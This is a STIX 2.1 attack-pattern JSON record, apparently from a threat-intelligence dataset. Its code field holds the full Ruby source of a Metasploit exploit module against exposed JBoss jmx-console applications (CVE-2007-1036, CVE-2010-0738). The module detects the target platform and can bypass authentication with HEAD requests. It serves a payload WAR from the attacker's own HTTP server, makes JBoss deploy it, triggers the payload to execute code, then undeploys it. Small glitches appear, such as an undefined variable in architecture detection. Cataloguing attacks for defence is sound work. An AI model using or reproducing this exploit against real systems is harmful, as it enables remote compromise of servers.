{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b32cbbe9-e391-4042-bdff-e2ade27aef91",
    "created": "2024-08-14T17:11:10.044406Z",
    "modified": "2024-08-14T17:11:10.04441Z",
    "name": "JBoss JMX Console Deployer Upload and Execute",
    "description": " This module can be used to execute a payload on JBoss servers that have an exposed \"jmx-console\" application. The payload is put on the server by using the jboss.system:MainDeployer functionality. To accomplish this, a temporary HTTP server is created to serve a WAR archive containing our payload. This method will only work if the target server allows outbound connections to us. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jboss_maindeployer.rb",
            "external_id": "jboss_maindeployer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1036"
        },
        {
            "source_name": "reference",
            "url": "http://www.redteam-pentesting.de/publications/jboss"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /(Jetty|JBoss)/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'JBoss JMX Console Deployer Upload and Execute',\n      'Description' => %q{\n          This module can be used to execute a payload on JBoss servers that have\n        an exposed \"jmx-console\" application. The payload is put on the server by\n        using the jboss.system:MainDeployer functionality. To accomplish this, a\n        temporary HTTP server is created to serve a WAR archive containing our\n        payload. This method will only work if the target server allows outbound\n        connections to us.\n      },\n      'Author'      => [ 'jduck', 'Patrick Hof', 'h0ng10'],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2007-1036' ],\n          [ 'CVE', '2010-0738' ], # by using VERB other than GET/POST\n          [ 'OSVDB', '33744' ],\n          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ], #For CVE-2010-0738\n        ],\n      'DisclosureDate' => '2007-02-20',\n      'Privileged'  => true,\n      'Platform'    => %w{ java linux win },\n      'Stance'      => Msf::Exploit::Stance::Aggressive,\n      'Targets'     =>\n        [\n          #\n          # do target detection but java meter by default\n          # detect via /manager/serverinfo\n          #\n          [ 'Automatic (Java based)',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ],\n\n          #\n          # Platform specific targets only\n          #\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            },\n          ],\n          [ 'Linux Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ],\n\n          #\n          # Java version\n          #\n          [ 'Java Universal',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('HttpUsername', [ false, 'The username to authenticate as' ]),\n        OptString.new('HttpPassword', [ false, 'The password for the specified username' ]),\n        OptString.new('JSP',      [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),\n        OptString.new('APPBASE',  [ false, 'Application base name, (default: random)', nil ]),\n        OptString.new('PATH',     [ true,  'The URI path of the console', '/jmx-console' ]),\n        OptString.new('WARHOST',  [ false, 'The host to request the WAR payload from' ]),\n        OptString.new('SRVHOST',  [ true, 'The local host to listen on. This must be an address on the local machine' ]),\n        OptEnum.new('VERB', [true, 'HTTP Method to use (for CVE-2010-0738)', 'GET', ['GET', 'POST', 'HEAD']])\n\n\n      ])\n  end\n\n\n  def auto_target\n    if datastore['VERB'] == 'HEAD' then\n      print_status(\"Sorry, automatic target detection doesn't work with HEAD requests\")\n    else\n      print_status(\"Attempting to automatically select a target...\")\n      res = query_serverinfo\n      if not (plat = detect_platform(res))\n        fail_with(Failure::NoTarget, 'Unable to detect platform!')\n      end\n\n      if not (arch = detect_architecture(res))\n        fail_with(Failure::NoTarget, 'Unable to detect architecture!')\n      end\n\n      # see if we have a match\n      targets.each { |t| return t if (t['Platform'] == plat) and (t['Arch'] == arch) }\n    end\n\n    # no matching target found, use Java as fallback\n    java_targets = targets.select {|t| t.name =~ /^Java/ }\n    return java_targets[0]\n  end\n\n\n  def exploit\n    jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))\n    app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))\n\n    mytarget = target\n    if (target.name =~ /Automatic/)\n      mytarget = auto_target()\n      if (not mytarget)\n        fail_with(Failure::NoTarget, \"Unable to automatically select a target\")\n      end\n      print_status(\"Automatically selected target \\\"#{mytarget.name}\\\"\")\n    else\n      print_status(\"Using manually select target \\\"#{mytarget.name}\\\"\")\n    end\n    arch = mytarget.arch\n\n    # set arch/platform from the target\n    plat = [Msf::Module::PlatformList.new(mytarget['Platform']).platforms[0]]\n\n    # We must regenerate the payload in case our auto-magic changed something.\n    return if ((p = exploit_regenerate_payload(plat, arch)) == nil)\n\n    # Generate the WAR containing the payload\n    @war_data = p.encoded_war({\n      :app_name => app_base,\n      :jsp_name => jsp_name,\n      :arch => mytarget.arch,\n      :platform => mytarget.platform\n    })\n\n    #\n    # UPLOAD\n    #\n    resource_uri = '/' + app_base + '.war'\n    service_url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri\n    print_status(\"Starting up our web service on #{service_url} ...\")\n    start_service({'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }})\n\n    if (datastore['WARHOST'])\n      service_url = 'http://' + datastore['WARHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri\n    end\n\n    print_status(\"Asking the JBoss server to deploy (via MainDeployer) #{service_url}\")\n    if (datastore['VERB'] == \"POST\")\n      res = send_request_cgi({\n          'method'    => datastore['VERB'],\n          'uri'       => normalize_uri(datastore['PATH'], '/HtmlAdaptor'),\n          'vars_post' =>\n            {\n              'action'      => 'invokeOpByName',\n              'name'        => 'jboss.system:service=MainDeployer',\n              'methodName'  => 'deploy',\n              'argType'     => 'java.lang.String',\n              'arg0'        => service_url\n            }\n        }, 30)\n    else\n      res = send_request_cgi({\n          'method'    => datastore['VERB'],\n          'uri'       => normalize_uri(datastore['PATH'], '/HtmlAdaptor'),\n          'vars_get' =>\n            {\n              'action'      => 'invokeOpByName',\n              'name'        => 'jboss.system:service=MainDeployer',\n              'methodName'  => 'deploy',\n              'argType'     => 'java.lang.String',\n              'arg0'        => service_url\n            }\n        }, 30)\n    end\n    if (! res)\n      fail_with(Failure::Unknown, \"Unable to deploy WAR archive [No Response]\")\n    end\n    if (res.code < 200 or res.code >= 300)\n      case res.code\n      when 401\n        print_warning(\"Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}\")\n      end\n      fail_with(Failure::Unknown, \"Upload to deploy WAR archive [#{res.code} #{res.message}]\")\n    end\n\n    # wait for the data to be sent\n    print_status(\"Waiting for the server to request the WAR archive....\")\n    waited = 0\n    while (not @war_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > 30)\n        fail_with(Failure::Unknown, 'Server did not request WAR archive -- Maybe it cant connect back to us?')\n      end\n    end\n\n    print_status(\"Shutting down the web service...\")\n    cleanup_service\n\n\n    #\n    # EXECUTE\n    #\n    print_status(\"Executing #{app_base}...\")\n\n    # The payload doesn't like POST requests\n    # As the war file is not stored inside the jmx-console, we don't have to\n    # care about the selected http method\n    tmp_verb = datastore['VERB']\n    tmp_verb = 'GET' if tmp_verb == 'POST'\n\n    # JBoss might need some time for the deployment. Try 5 times at most and\n    # wait 3 seconds inbetween tries\n    uri = '/' + app_base + '/' + jsp_name + '.jsp'\n    num_attempts = 5\n    num_attempts.times do |attempt|\n      res = send_request_cgi({\n          'uri'     => uri,\n          'method'  => tmp_verb\n        }, 30)\n\n      msg = nil\n      if (! res)\n        msg = \"Execution failed on #{app_base} [No Response]\"\n      elsif (res.code < 200 or res.code >= 300)\n        msg = \"Execution failed on #{app_base} [#{res.code} #{res.message}]\"\n      elsif (res.code == 200)\n        print_good(\"Successfully triggered payload at '#{uri}'\")\n        break\n      end\n\n      if (attempt < num_attempts - 1)\n        msg << \", retrying in 3 seconds...\"\n        print_error(msg)\n\n        select(nil, nil, nil, 3)\n      else\n        print_error(msg)\n      end\n    end\n\n    #\n    # DELETE\n    #\n    # XXX: Does undeploy have an invokeByName?\n    #\n    print_status(\"Undeploying #{app_base} ...\")\n    res = send_request_cgi({\n      'method'    => datastore['VERB'],\n      'uri'       => normalize_uri(datastore['PATH'], '/HtmlAdaptor'),\n      'vars_post' =>\n        {\n          'action'      => 'invokeOpByName',\n          'name'        => 'jboss.system:service=MainDeployer',\n          'methodName'  => 'methodName=undeploy',\n          'argType'     => 'java.lang.String',\n          'arg0'        => app_base\n        }\n    }, 30)\n    if (! res)\n      print_warning(\"WARNING: Undeployment failed on #{app_base} [No Response]\")\n    elsif (res.code == 500 and datastore['VERB'] == 'POST')\n      # POST requests result in a http 500 error, but the payload is removed...\"\n      print_warning(\"WARNING: Undeployment might have failed (unlikely)\")\n    elsif (res.code < 200 or res.code >= 300)\n      print_warning(\"WARNING: Undeployment failed on #{app_base} [#{res.code} #{res.message}]\")\n    end\n\n    handler\n  end\n\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n\n    #print_status(\"on_request_uri called: #{request.inspect}\")\n    if (not @war_data)\n      print_error(\"A request came in, but the WAR archive wasn't ready yet!\")\n      return\n    end\n\n    print_status(\"Sending the WAR archive to the server...\")\n    send_response(cli, @war_data)\n    @war_sent = true\n  end\n\n\n  def query_serverinfo\n    path = normalize_uri(datastore['PATH'], '/HtmlAdaptor') + '?action=inspectMBean&name=jboss.system:type=ServerInfo'\n    res = send_request_raw(\n      {\n        'uri'    => path\n      }, 20)\n\n    if (res) && (res.code == 401)\n      fail_with(Failure::NoAccess,\"Unable to bypass authentication.  Try changing the verb to HEAD to exploit CVE-2010-0738.\")\n    end\n\n    if (not res) or (res.code != 200)\n      fail_with(Failure::Unknown,\"Failed: Error requesting #{path}\")\n    end\n\n    res\n  end\n\n  def autofilter\n    true\n  end\n\n  # Try to autodetect the target platform\n  def detect_platform(res)\n    if (res.body =~ /<td.*?OSName.*?(Linux|FreeBSD|Windows).*?<\\/td>/m)\n      os = $1\n      if (os =~ /Linux/i)\n        return 'linux'\n      elsif (os =~ /FreeBSD/i)\n        return 'linux'\n      elsif (os =~ /Windows/i)\n        return 'win'\n      end\n    end\n    nil\n  end\n\n\n  # Try to autodetect the target architecture\n  def detect_architecture(res)\n    if (res.body =~ /<td.*?OSArch.*?(x86_64|amd64|x86|i386|i686).*?<\\/td>/m)\n      case arch\n      when 'x86', 'i386', 'i686'\n        return ARCH_X86\n      when 'x86_64', 'amd64'\n        return ARCH_X64\n      end\n    end\n    nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-02-20",
    "x_mitre_platforms": [
        "java'"
    ]
}